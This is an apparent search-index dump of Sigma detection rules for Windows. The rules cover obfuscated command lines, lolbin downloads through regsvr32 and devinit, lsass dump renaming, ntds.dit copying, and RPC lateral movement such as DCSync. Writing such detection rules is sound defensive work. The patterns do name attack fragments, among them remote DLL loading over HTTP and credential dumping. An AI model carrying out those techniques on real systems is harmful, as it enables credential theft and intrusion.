e0552b19-5a83-4222-b141-b36184bb8d79 status: experimental description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. author: frack113 references: - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-6---dlp-evasion-via-sensitive-data-in-vba-macro-over-http date: 2022/01/15 logsource: category: process_creation product: windows detection: selection: #find the sysmon event CommandLine|contains: - \u0026#39;â\u0026#39; - \u0026#39;€\u0026#39; - \u0026#39;£\u0026#39; - \u0026#39;¯\u0026#39; - \u0026#39;®\u0026#39; - \u0026#39;µ\u0026#39; - \u0026#39;¶\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_char_in_cmd.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"Obfuscated Command Line Using Special Unicode Characters"},{"categories":null,"contents":"Payloads may be compressed, archived, or encrypted in order to avoid detection\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-4---execution-from-compressed-file Raw rule (edit) title: Run from a Zip File id: 1a70042a-6622-4a2b-8958-267625349abf status: experimental description: Payloads may be compressed, archived, or encrypted in order to avoid detection author: frack113 date: 2021/12/26 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-4---execution-from-compressed-file logsource: category: process_creation product: windows detection: selection: Image|contains: \u0026#39;.zip\\\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.impact - attack.t1485 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_run_from_zip.yml/","tags":["attack.impact","attack.t1485"],"title":"Run from a Zip File"},{"categories":null,"contents":"Powershell use PassThru option to start in background\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Start-Process?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 Raw rule (edit) title: Suspicious Start-Process PassThru id: 0718cd72-f316-4aa2-988f-838ea8533277 status: experimental description: Powershell use PassThru option to start in background author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Start-Process?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 date: 2022/01/15 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Start-Process - \u0026#39;-PassThru \u0026#39; - \u0026#39;-FilePath \u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_start_process.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Suspicious Start-Process PassThru"},{"categories":null,"contents":"Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-3---remove-the-zoneidentifier-alternate-data-stream https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/unblock-file?view=powershell-7.2 Raw rule (edit) title: Suspicious Unblock-File id: 5947497f-1aa4-41dd-9693-c9848d58727d status: experimental description: Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet. date: 2022/02/01 author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-3---remove-the-zoneidentifier-alternate-data-stream - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/unblock-file?view=powershell-7.2 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Unblock-File \u0026#39; - \u0026#39;-Path \u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1553.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_unblock_file.yml/","tags":["attack.defense_evasion","attack.t1553.005"],"title":"Suspicious Unblock-File"},{"categories":null,"contents":"Powershell Remove-Item with -Path to delete a file or a folder with \u0026ldquo;-Recurse\u0026rdquo;\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Remove-Item?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 Raw rule (edit) title: Use Remove-Item to Delete File id: b8af5f36-1361-4ebe-9e76-e36128d947bf status: experimental description: Powershell Remove-Item with -Path to delete a file or a folder with \u0026#34;-Recurse\u0026#34; author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Remove-Item?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 date: 2022/01/15 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Remove-Item - \u0026#39;-Path \u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.defense_evasion - attack.t1070.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_remove_item_path.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Use Remove-Item to Delete File"},{"categories":null,"contents":"Detects suspicious command line patterns used when rundll32 is used to run JavaScript code\nKnown false-positives unknown References http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt Raw rule (edit) title: Rundll32 JS RunHTMLApplication Pattern id: 9f06447a-a33a-4cbe-a94f-a3f43184a7a3 status: experimental description: Detects suspicious command line patterns used when rundll32 is used to run JavaScript code author: Florian Roth date: 2022/01/14 references: - http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;rundll32\u0026#39; - \u0026#39;javascript\u0026#39; - \u0026#39;..\\..\\mshtml,RunHTMLApplication\u0026#39; selection2: CommandLine|contains: - \u0026#39;;document.write();GetObject(\u0026#34;script\u0026#39; condition: 1 of selection* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_js_runhtmlapplication.yml/","tags":["attack.defense_evasion"],"title":"Rundll32 JS RunHTMLApplication Pattern"},{"categories":null,"contents":"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information\nKnown false-positives Legitimate PowerShell scripts References https://attack.mitre.org/datasources/DS0005/ https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 Raw rule (edit) title: Create Volume Shadow Copy with Powershell id: afd12fed-b0ec-45c9-a13d-aa86625dac81 status: experimental description: Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information date: 2022/01/12 author: frack113 references: - https://attack.mitre.org/datasources/DS0005/ - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - win32_shadowcopy - \u0026#39;).Create(\u0026#39; - ClientAccessible condition: selection falsepositives: - Legitimate PowerShell scripts level: high tags: - attack.credential_access - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_create_volume_shadow_copy.yml/","tags":["attack.credential_access","attack.t1003.003"],"title":"Create Volume Shadow Copy with Powershell"},{"categories":null,"contents":"The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers\nKnown false-positives Legitimate PowerShell scripts References https://attack.mitre.org/datasources/DS0005/ https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 Raw rule (edit) title: Suspicious Get-WmiObject id: 0332a266-b584-47b4-933d-a00b103e1b37 status: experimental description: The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers date: 2022/01/12 author: frack113 references: - https://attack.mitre.org/datasources/DS0005/ - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\u0026amp;viewFallbackFrom=powershell-7 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - Get-WmiObject - gwmi condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.persistence - attack.t1546 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_gwmi.yml/","tags":["attack.persistence","attack.t1546"],"title":"Suspicious Get-WmiObject"},{"categories":null,"contents":"Detects a Sysmon configuration change, which could be the result of a legitimate reconfiguration or someone trying manipulate the configuration\nKnown false-positives legitimate administrative action References https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon Raw rule (edit) title: Sysmon Configuration Change id: 8ac03a65-6c84-4116-acad-dc1558ff7a77 description: Detects a Sysmon configuration change, which could be the result of a legitimate reconfiguration or someone trying manipulate the configuration status: experimental author: frack113 date: 2022/01/12 references: - https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon logsource: product: windows service: sysmon detection: selection: EventID: 16 # To avoid FP just add # filter: # ConfigurationFileHash: \u0026#39;SHA256=The_Hash_Of_Your_Valid_Config_XML\u0026#39; # condition: selection and not filter condition: selection falsepositives: - legitimate administrative action level: medium tags: - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_config_modification.yml/","tags":["attack.defense_evasion"],"title":"Sysmon Configuration Change"},{"categories":null,"contents":"Detects the uninstallation of Sysinternals Sysmon, which could be the result of legitimate administration or a manipulation for defense evasion\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-11---uninstall-sysmon Raw rule (edit) title: Uninstall Sysinternals Sysmon id: 6a5f68d1-c4b5-46b9-94ee-5324892ea939 status: experimental description: Detects the uninstallation of Sysinternals Sysmon, which could be the result of legitimate administration or a manipulation for defense evasion references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-11---uninstall-sysmon author: frack113 date: 2022/01/12 logsource: category: process_creation product: windows detection: sysmon: Image|endswith: - \\Sysmon64.exe - \\Sysmon.exe CommandLine|contains: \u0026#39;-u\u0026#39; condition: sysmon falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uninstall_sysmon.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Uninstall Sysinternals Sysmon"},{"categories":null,"contents":"Detects the suspicious minimized start of MsEdge browser, which can be used to download files from the Internet\nKnown false-positives Software that uses MsEdge to download components in the background (see ParentImage, ParentCommandLine) References https://twitter.com/mrd0x/status/1478234484881436672?s=12 Raw rule (edit) title: Suspicious Minimized MSEdge Start id: 94771a71-ba41-4b6e-a757-b531372eaab6 description: Detects the suspicious minimized start of MsEdge browser, which can be used to download files from the Internet author: Florian Roth date: 2022/01/11 references: - https://twitter.com/mrd0x/status/1478234484881436672?s=12 tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;start /min msedge\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Software that uses MsEdge to download components in the background (see ParentImage, ParentCommandLine) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_msedge_minimized_download.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Minimized MSEdge Start"},{"categories":null,"contents":"Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file\nKnown false-positives Unknown References https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/ https://adsecurity.org/?p=2398 Raw rule (edit) title: Suspicious Process Writes Ntds.dit id: 11b1ed55-154d-4e82-8ad7-83739298f720 status: experimental description: Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file references: - https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/ - https://adsecurity.org/?p=2398 author: Florian Roth date: 2022/01/11 tags: - attack.credential_access - attack.t1003.002 - attack.t1003.003 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;\\ntds.dit\u0026#39; Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\cmd.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_ntds_dit.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.003"],"title":"Suspicious Process Writes Ntds.dit"},{"categories":null,"contents":"Detects a certain command line flag combination used by regsvr32 when used to download and register a DLL from a remote address which uses HTTP (not HTTPS) and a IP address and not FQDN\nKnown false-positives FQDNs that start with a number References https://twitter.com/mrd0x/status/1461041276514623491c19-ps https://twitter.com/tccontre18/status/1480950986650832903 Raw rule (edit) title: Suspicious Regsvr32 HTTP IP Pattern id: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8 status: experimental description: Detects a certain command line flag combination used by regsvr32 when used to download and register a DLL from a remote address which uses HTTP (not HTTPS) and a IP address and not FQDN references: - https://twitter.com/mrd0x/status/1461041276514623491c19-ps - https://twitter.com/tccontre18/status/1480950986650832903 tags: - attack.defense_evasion - attack.t1218.010 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection_flags: CommandLine|contains|all: - \u0026#39; /s\u0026#39; - \u0026#39; /u\u0026#39; selection_ip: CommandLine|contains: - \u0026#39; /i:http://1\u0026#39; - \u0026#39; /i:http://2\u0026#39; - \u0026#39; /i:http://3\u0026#39; - \u0026#39; /i:http://4\u0026#39; - \u0026#39; /i:http://5\u0026#39; - \u0026#39; /i:http://6\u0026#39; - \u0026#39; /i:http://7\u0026#39; - \u0026#39; /i:http://8\u0026#39; - \u0026#39; /i:http://9\u0026#39; condition: all of selection* falsepositives: - FQDNs that start with a number level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regsvr32_http_pattern.yml/","tags":["attack.defense_evasion","attack.t1218.010"],"title":"Suspicious Regsvr32 HTTP IP Pattern"},{"categories":null,"contents":"Detects a certain command line flag combination used by devinit.exe lolbin to download arbitrary MSI packages on a Windows system\nKnown false-positives Unknown References https://twitter.com/mrd0x/status/1460815932402679809 Raw rule (edit) title: DevInit Lolbin Download id: 90d50722-0483-4065-8e35-57efaadd354d status: experimental description: Detects a certain command line flag combination used by devinit.exe lolbin to download arbitrary MSI packages on a Windows system references: - https://twitter.com/mrd0x/status/1460815932402679809 tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; -t msi-install \u0026#39; - \u0026#39; -i http\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_devinit_lolbin.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218"],"title":"DevInit Lolbin Download"},{"categories":null,"contents":"Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary\nKnown false-positives Other tools with the same command line flag combination Legitimate uses as part of Visual Studio development References https://twitter.com/mrd0x/status/1463526834918854661 Raw rule (edit) title: NodejsTools PressAnyKey Lolbin id: a20391f8-76fb-437b-abc0-dba2df1952c6 status: experimental description: Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary references: - https://twitter.com/mrd0x/status/1463526834918854661 tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39;Microsoft.NodejsTools.PressAnyKey.exe normal \u0026#39; selection2: CommandLine|contains: \u0026#39;.exe normal \u0026#39; CommandLine|endswith: \u0026#39;.exe\u0026#39; filter: Image|contains: \u0026#39;\\Microsoft\\NodeJsTools\\NodeJsTools\u0026#39; condition: 1 of selection* and not 1 of filter* falsepositives: - Other tools with the same command line flag combination - Legitimate uses as part of Visual Studio development level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_pressynkey_lolbin.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218"],"title":"NodejsTools PressAnyKey Lolbin"},{"categories":null,"contents":"Detects uses of the SysInternals Procdump utility in which procdump or its output get renamed or a dump file is moved ot copied to a different name\nKnown false-positives Cases in which procdump just gets copied to a different directory without any renaming References https://twitter.com/mrd0x/status/1480785527901204481 Raw rule (edit) title: Procdump Evasion id: 79b06761-465f-4f88-9ef2-150e24d3d737 description: Detects uses of the SysInternals Procdump utility in which procdump or its output get renamed or a dump file is moved ot copied to a different name status: experimental references: - https://twitter.com/mrd0x/status/1480785527901204481 author: Florian Roth date: 2022/01/11 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;copy procdump\u0026#39; - \u0026#39;move procdump\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;copy \u0026#39; - \u0026#39;.dmp \u0026#39; CommandLine|contains: - \u0026#39;2.dmp\u0026#39; - \u0026#39;lsass\u0026#39; - \u0026#39;out.dmp\u0026#39; selection3: CommandLine|contains: - \u0026#39;copy lsass.exe_\u0026#39; # procdump default pattern e.g. lsass.exe_220111_085234.dmp - \u0026#39;move lsass.exe_\u0026#39; # procdump default pattern e.g. lsass.exe_220111_085234.dmp condition: 1 of selection* falsepositives: - Cases in which procdump just gets copied to a different directory without any renaming level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_procdump_evasion.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1003.001"],"title":"Procdump Evasion"},{"categories":null,"contents":"Detects remote RPC calls to MS-DRSR from non DC hosts, which could indicate DCSync / DCShadow attacks.\nKnown false-positives Unknown References https://attack.mitre.org/techniques/T1033/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-DRSR.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Possible DCSync Attack id: 56fda488-113e-4ce9-8076-afc2457922c3 description: Detects remote RPC calls to MS-DRSR from non DC hosts, which could indicate DCSync / DCShadow attacks. references: - https://attack.mitre.org/techniques/T1033/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-DRSR.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.t1033 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes, enable DRSR UUID (e3514235-4b06-11d1-ab04-00c04fc2dcd2) for \u0026#34;dangerous\u0026#34; opcodes (not 0,1 or 12) only from trusted IPs (DCs)\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: e3514235-4b06-11d1-ab04-00c04fc2dcd2 filter: OpNum: - 0 - 1 - 12 condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_dcsync_attack.yml/","tags":["attack.t1033"],"title":"Possible DCSync Attack"},{"categories":null,"contents":"Detects remote RPC calls that performs remote DCOM operations. These could be abused for lateral movement via DCOM or WMI.\nKnown false-positives Some administrative tasks on remote host References https://attack.mitre.org/tactics/TA0008/ https://attack.mitre.org/techniques/T1021/003/ https://attack.mitre.org/techniques/T1047/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote DCOM/WMI Lateral Movement id: 68050b10-e477-4377-a99b-3721b422d6ef description: Detects remote RPC calls that performs remote DCOM operations. These could be abused for lateral movement via DCOM or WMI. references: - https://attack.mitre.org/tactics/TA0008/ - https://attack.mitre.org/techniques/T1021/003/ - https://attack.mitre.org/techniques/T1047/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement - attack.t1021.003 - attack.t1047 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:367abb81-9844-35f1-ad32-98f038001003\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57 - 99fcfec4-5260-101b-bbcb-00aa0021347a - 000001a0-0000-0000-c000-000000000046 - 00000131-0000-0000-c000-000000000046 - 00000143-0000-0000-c000-000000000046 - 00000000-0000-0000-c000-000000000046 condition: selection falsepositives: - Some administrative tasks on remote host level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_remote_dcom_or_wmi.yml/","tags":["attack.lateral_movement","attack.t1021.003","attack.t1047"],"title":"Remote DCOM/WMI Lateral Movement"},{"categories":null,"contents":"Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR\nKnown false-positives Legitimate usage of remote file encryption References https://attack.mitre.org/tactics/TA0008/ https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-EFSR.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Encrypting File System Abuse id: 5f92fff9-82e2-48eb-8fc1-8b133556a551 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR references: - https://attack.mitre.org/tactics/TA0008/ - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-EFSR.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - df1941c5-fe89-4e79-bf10-463657acf44d - c681d488-d850-11d0-8c52-00c04fd90f7e condition: selection falsepositives: - Legitimate usage of remote file encryption level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_efs_abuse.yml/","tags":["attack.lateral_movement"],"title":"Remote Encrypting File System Abuse"},{"categories":null,"contents":"Detects remote RPC calls to get event log information via EVEN or EVEN6\nKnown false-positives remote administrative tasks on Windows Events References https://attack.mitre.org/tactics/TA0007/ https://github.com/zeronetworks/rpcfirewall https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Event Log Recon id: 2053961f-44c7-4a64-b62d-f6e72800af0d description: Detects remote RPC calls to get event log information via EVEN or EVEN6 references: - https://attack.mitre.org/tactics/TA0007/ - https://github.com/zeronetworks/rpcfirewall - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:82273fdc-e32a-18c3-3f78-827929dc23ea and uuid:f6beaff7-1e19-4fbb-9f8f-b89e2018337c\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 82273fdc-e32a-18c3-3f78-827929dc23ea - f6beaff7-1e19-4fbb-9f8f-b89e2018337c condition: selection falsepositives: - remote administrative tasks on Windows Events level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_eventlog_recon.yml/","tags":null,"title":"Remote Event Log Recon"},{"categories":null,"contents":"Detects remote RPC calls to possibly abuse remote printing service via MS-RPRN / MS-PAR\nKnown false-positives actual printing References https://attack.mitre.org/tactics/TA0008/ https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pan/e44d984c-07d3-414c-8ffc-f8c8ad8512a8 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RPRN-PAR.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Printing Abuse for Lateral Movement id: bc3a4b0c-e167-48e1-aa88-b3020950e560 description: Detects remote RPC calls to possibly abuse remote printing service via MS-RPRN / MS-PAR references: - https://attack.mitre.org/tactics/TA0008/ - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1 - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pan/e44d984c-07d3-414c-8ffc-f8c8ad8512a8 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RPRN-PAR.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:12345678-1234-abcd-ef00-0123456789ab or 76f03f96-cdfd-44fc-a22c-64950a001209 or ae33069b-a2a8-46ee-a235-ddfd339be281 or 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 12345678-1234-abcd-ef00-0123456789ab - 76f03f96-cdfd-44fc-a22c-64950a001209 - 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 - ae33069b-a2a8-46ee-a235-ddfd339be281 condition: selection falsepositives: - actual printing level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_printing_lateral_movement.yml/","tags":["attack.lateral_movement"],"title":"Remote Printing Abuse for Lateral Movement"},{"categories":null,"contents":"Detects remote RPC calls to modify the registry and possible execute code\nKnown false-positives Remote administration of registry values References https://attack.mitre.org/techniques/T1112/ https://attack.mitre.org/tactics/TA0008/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Registry Lateral Movement id: 35c55673-84ca-4e99-8d09-e334f3c29539 description: Detects remote RPC calls to modify the registry and possible execute code references: - https://attack.mitre.org/techniques/T1112/ - https://attack.mitre.org/tactics/TA0008/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:338cd001-2244-31f1-aaaa-900038001003\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 338cd001-2244-31f1-aaaa-900038001003 OpNum: - 6 - 7 - 8 - 13 - 18 